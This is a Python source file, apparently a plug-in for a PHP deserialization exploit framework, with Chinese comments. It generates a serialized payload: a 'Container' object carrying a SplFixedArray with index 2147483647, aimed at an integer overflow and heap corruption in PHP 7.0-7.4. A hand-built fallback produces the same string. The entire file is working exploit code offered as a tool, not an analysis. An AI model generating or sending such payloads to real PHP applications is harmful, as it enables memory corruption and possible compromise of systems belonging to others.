"""
SplFixedArray 整数溢出高级策略 - PHP 7.0-7.4
用于生成基于 SplFixedArray 堆内存破坏的 Payload
"""

from typing import Any, Dict, Optional
from .base_advanced import AdvancedStrategy
from ..registry import register_advanced_strategy


@register_advanced_strategy(lambda features: 'spl_fixed_array' in features.tags)
class SplFixedArrayStrategy(AdvancedStrategy):
    """
    SplFixedArray 整数溢出策略
    
    利用 PHP 7.0-7.4 中 SplFixedArray 的整数溢出漏洞 (CVE 相关)。
    通过构造极大的索引值触发堆内存破坏。
    """
    
    def generate(self, classes: list, features: Any, **kwargs) -> str:
        """
        生成 SplFixedArray 溢出 Payload
        
        使用原始值注入技术，将 arr 属性替换为溢出版本的序列化字符串。
        """
        # 查找 Container 类
        container_class = None
        for cls in classes:
            if cls.name == 'Container':
                container_class = cls
                break
        
        if not container_class:
            # 如果没有找到 Container 类，返回基础结构
            return self._generate_generic_splfixedarray_payload()
        
        # 构造带有原始注入的 Payload
        # 目标：O:9:"Container":1:{s:3:"arr";C:13:"SplFixedArray":i:2147483647;}
        
        # 首先获取 V2 引擎生成的基础 Payload
        from core_v2.serializer.php import serialize_php
        
        # 构造一个临时的类信息，用于生成基础结构
        temp_properties = {'arr': None}
        
        # 使用原始值注入
        raw_injections = {
            'arr': 'C:13:"SplFixedArray":10:{i:2147483647;}'
        }
        
        try:
            payload = serialize_php(
                class_name='Container',
                properties=temp_properties,
                raw_injections=raw_injections
            )
            return payload
        except Exception as e:
            # 如果注入失败，返回手动构造的 Payload
            return self._generate_manual_overflow_payload()
    
    def _generate_generic_splfixedarray_payload(self) -> str:
        """生成通用的 SplFixedArray Payload"""
        return self._generate_manual_overflow_payload()
    
    def _generate_manual_overflow_payload(self) -> str:
        """手动构造溢出 Payload（备用方案）"""
        # O:9:"Container":1:{s:3:"arr";C:13:"SplFixedArray":10:{i:2147483647;}}
        overflow_data = 'i:2147483647;'
        spl_serialized = f'C:13:"SplFixedArray":{len(overflow_data)}:{{{overflow_data}}}'
        return f'O:9:"Container":1:{{s:3:"arr";{spl_serialized}}}'
    
    def get_description(self) -> str:
        return "V3 实验性 SplFixedArray 溢出策略 - 适用于 PHP 7.0-7.4"
